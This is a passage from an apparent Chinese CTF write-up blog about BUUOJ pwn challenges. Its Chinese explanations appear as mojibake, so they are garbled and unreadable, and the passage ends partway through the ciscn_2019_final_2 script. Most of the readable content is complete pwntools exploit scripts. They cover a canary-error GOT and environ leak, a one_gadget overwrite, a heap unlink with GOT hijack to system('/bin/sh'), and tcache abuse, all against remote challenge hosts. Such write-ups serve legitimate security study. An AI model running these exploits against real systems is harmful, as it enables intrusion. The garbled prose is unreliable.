æˆ‘ä»¬è¾“å…¥ä¸__libc_argv[0] çš„åç§»</p><p>__libc_argv[0] é‡Œå­˜çš„å°±æ˜¯./GUESSï¼ŒæŠ¥é”™æ—¶</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-strong">**<span class="hljs-emphasis">*stack smashing detected*</span>**</span>: ./GUESS terminated<br></code></pre></td></tr></table></figure><p>å°±ä¼šæ‰“å°å¤„ç¨‹åºåå­—ï¼ŒæŠŠå®ƒè¦†ç›–æˆgotè¡¨ï¼Œå°±èƒ½æ‰“å°gotè¡¨äº†</p><p>0xdf38-0xde10=0x128</p><p><strong>2.ç¬¬äºŒæ¡å‘½ï¼Œæ³„éœ²_environï¼ˆç¯å¢ƒå˜é‡ï¼‰,ä¹Ÿæ˜¯æ ˆåœ°å€</strong></p><p>gdbè°ƒè¯•ç®—å‡ºflagä¸environçš„åç§»</p><p>ç”¨å‘½ä»¤</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sqf">x/a <span class="hljs-variable">_environ</span><br>search <span class="hljs-built_in">flag</span><br></code></pre></td></tr></table></figure><p>é€šè¿‡_environçš„åœ°å€å¾—åˆ°_environçš„å€¼ï¼Œä»è€Œå¾—åˆ°ç¯å¢ƒå˜é‡åœ°å€ï¼Œç¯å¢ƒå˜é‡ä¿å­˜åœ¨æ ˆä¸­ï¼Œæ‰€ä»¥é€šè¿‡æ ˆå†…çš„åç§»é‡ï¼Œå¯ä»¥è®¿é—®æ ˆä¸­ä»»æ„å˜é‡</p><p>0xd8a8-0xd740=0x168</p><p><strong>3.ç¬¬ä¸‰æ¡å‘½ï¼Œæ³„éœ²flag</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./GUESS&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26170</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#----------------------------------------------</span><br>sla(<span class="hljs-string">&#x27;Please type your guessing flag\n&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x128</span>+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>puts_addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br>obj = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, puts_addr)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts_addr)<br>libc_base=puts_addr-obj.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc_base)<br>environ=libc_base+libc.sym[<span class="hljs-string">&#x27;__environ&#x27;</span>]<br><span class="hljs-comment">#----------------------------------------------</span><br>sla(<span class="hljs-string">&#x27;Please type your guessing flag\n&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x128</span>+p64(environ))<br>ru(<span class="hljs-string">&#x27;stack smashing detected ***: &#x27;</span>)<br>stack=uu64(rc(<span class="hljs-number">6</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(stack)<br><span class="hljs-comment">#---------------------------------------------</span><br>sla(<span class="hljs-string">&#x27;Please type your guessing flag\n&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x128</span>+p64(stack-<span class="hljs-number">0x168</span>))<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="oneshot-tjctf-2016">oneshot_tjctf_2016</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-comment">#r=process(&#x27;./oneshot_tjctf_2016&#x27;)</span><br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25296</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./oneshot_tjctf_2016&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>r.sendline(<span class="hljs-built_in">str</span>(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>r.recvuntil(<span class="hljs-string">&#x27;Value: 0x0000&#x27;</span>)<br>puts_addr=<span class="hljs-built_in">int</span>(r.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>libc_base=puts_addr-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc_base)<br>og=libc_base+<span class="hljs-number">0x45216</span><br>r.sendline(<span class="hljs-built_in">str</span>(og))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="zctf2016-note2">zctf2016_note2</h3><p>å‚è€ƒå¸ˆå‚…ï¼š<a href="https://blog.csdn.net/seaaseesa/article/details/105588640">(1æ¡æ¶ˆæ¯) zctf2016_note2_seaaseesaçš„åšå®¢-CSDNåšå®¢</a></p><p>å †æº¢å‡ºã€‹unlinkã€‹æ³„éœ²gotã€‹åŠ«æŒgotã€‹å¼€shell</p><p>è¿™é¢˜æ¼æ´åœ¨ä¸€ä¸ªè¾“å…¥å‡½æ•°é‡Œï¼Œåˆ¤æ–­è¯­å¥æœ‰ä¸ªsize-1ï¼Œè€Œä¸”è¿™ä¸ªæ˜¯æ— ç¬¦å·æ•´æ•°ï¼Œæˆ‘ä»¬ç”³è¯·sizeå¤§å°ä¸º0ï¼Œ0-1åï¼Œå°±ä¼šå¼ºè½¬æˆä¸€ä¸ªæå¤§å€¼ï¼Œé€ æˆä»»æ„å¤§å°çš„å †æº¢å‡º</p><p>å†åŠ ä¹‹æœ¬é¢˜æœ‰æŒ‡é’ˆæ•°ç»„ï¼Œé‡‡ç”¨unlinkçš„åšæ³•ï¼Œæ³„éœ²atoiçš„gotè¡¨æœ€æ–¹ä¾¿</p><p>è¿™é¢˜idaè¦ä»”ç»†çœ‹ï¼Œè¾“å…¥å¤„ç†æœ‰strncatï¼Œstrcpyè¿™äº›å‡½æ•°ï¼Œé‡åˆ°\x0æˆªæ–­ï¼Œæ‰€ä»¥ä¼ªé€ chunkæ—¶è¦åˆ†æ­¥ï¼Œå…ˆæŠŠåé¢çš„sizeæ”¹æ‰ï¼Œå†å¤„ç†å‰é¢å¡«å……å­—ç¬¦ï¼Œç”¨å¾ªç¯ï¼Œèƒ½å¤„ç†å¡«å……å­—ç¬¦å˜ä¸º\x0æ˜¯å› ä¸ºæœ‰   v1[size - strlen(&amp;dest) + 14] = 0   è¿™ä¸ªè¯­å¥ï¼ˆæˆ‘çŒœçš„ï¼Œä¸ç„¶ä¸ä¹Ÿæ˜¯æ¥å—åˆ°\x0å°±æˆªæ–­ï¼Œå’‹å¤„ç†ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./note2&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28331</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#---------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>        sla(<span class="hljs-string">&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Input the length of the note content:(less than 128)\n&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>        sla(<span class="hljs-string">&#x27;Input the note content:\n&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>        sla(<span class="hljs-string">&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Input the id of the note:\n&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,choice,content</span>):<br>        sla(<span class="hljs-string">&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Input the id of the note:\n&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>        sla(<span class="hljs-string">&#x27;do you want to overwrite or append?[1.overwrite/2.append]\n&#x27;</span>,<span class="hljs-built_in">str</span>(choice))<br>        <span class="hljs-keyword">if</span> choice==<span class="hljs-number">1</span>:<br>                sla(<span class="hljs-string">&#x27;TheNewContents:&#x27;</span>,content)<br>        <span class="hljs-keyword">elif</span> choice==<span class="hljs-number">0</span>:<br>                sla(<span class="hljs-string">&#x27;TheNewContents:&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>        sla(<span class="hljs-string">&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Input the id of the note:\n&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#---------------------------------------------------------</span><br>sla(<span class="hljs-string">&#x27;Input your name:\n&#x27;</span>,<span class="hljs-string">&#x27;qyq&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Input your address:\n&#x27;</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>target=<span class="hljs-number">0x602120</span><br>fd=target-<span class="hljs-number">0x18</span><br>bk=target-<span class="hljs-number">0x10</span><br>add(<span class="hljs-number">0x80</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0xa1</span>)+p64(fd)+p64(bk))<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x0</span>,<span class="hljs-string">&#x27;&#x27;</span>)<span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<span class="hljs-comment">#2</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p8(<span class="hljs-number">0x90</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        edit(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+<span class="hljs-string">&#x27;a&#x27;</span>*i)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p8(<span class="hljs-number">0xa0</span>))<br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>]))<br>show(<span class="hljs-number">0</span>)<br>atoi_addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br>libc_base=atoi_addr-libc.sym[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc_base)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,p64(system))<br>sla(<span class="hljs-string">&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br><br><br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-final-2">ciscn_2019_final_2</h3><p>å¤ªéš¾å•¦</p><p>seccomp-tools dump ./ciscn_final_2</p><p>æ²™ç›’ï¼Œå¥½åƒå…¨å…³äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  =<span class="hljs-string">&#x27;./ciscn_final_2&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27943</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ty_pe,number</span>):<br>    sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(ty_pe))<br>    sla(<span class="hljs-string">&#x27;your inode number:&#x27;</span>,<span class="hljs-built_in">str</span>(number))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ty_pe</span>):<br>    sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(ty_pe))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ty_pe</span>):<br>    sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(ty_pe))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leave</span>(<span class="hljs-params">content</span>):<br>    sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;what do you want to say at last? \n&#x27;</span>,content)<br><span class="hljs-comment">#-----------------------------------------------------</span><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0xABCDEFabcdef</span>)<br>free(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>   add(<span class="hljs-number">2</span>,<span class="hljs-number">0xABCDEF</span>)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0xabcdefabcdef</span>)<span class="hljs-comment">#bool</span><br>free(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br>ru(<span class="hljs-string">&#x27;your short type inode number :&#x27;</span>)<br>heap_low_addr=<span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>])<br><span class="hljs-keyword">if</span> heap_low_addr &lt; <span class="hljs-number">0</span>:<br>   heap_low_addr += <span class="hljs-number">0x10000</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;heap_low_2byte=&#x27;</span>+<span class="hljs-built_in">hex</span>(heap_low_addr)<br>add(<span class="hljs-number">2</span>,heap_low_addr-<span class="hljs-number">0xa0</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x30</span> + <span class="hljs-number">0x20</span> * <span class="hljs-number">3</span> + <span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>   free(<span class="hljs-number">1</span>)<br>   add(<span class="hljs-number">2</span>,<span 